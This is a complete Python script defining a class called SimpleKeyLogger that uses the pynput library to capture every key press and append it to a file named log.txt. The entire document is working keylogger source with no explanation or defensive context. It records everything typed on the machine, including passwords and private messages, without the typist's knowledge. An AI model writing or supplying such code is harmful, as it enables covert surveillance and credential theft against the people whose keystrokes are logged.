#!/usr/bin/env python3

import pynput.keyboard

class SimpleKeyLogger:

	def __init__(self):
		self.logger = ""

	def add_to_file(self, key_strike):
		self.logger = self.logger + key_strike
		with open("log.txt", "a", encoding="utf-8") as f:
			f.write(self.logger)
		self.logger = ""

	def eval_Keys(self, key):
		try:
			pressed_key = str(key.char)
		except AttributeError:
			if key == key.space:
				pressed_key = " "
			else:
				pressed_key = " " + str(key) + " "
		self.add_to_file(pressed_key)

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.eval_Keys)
		with keyboard_listener:
			self.logger = ""
			keyboard_listener.join()

SimpleKeyLogger().start()
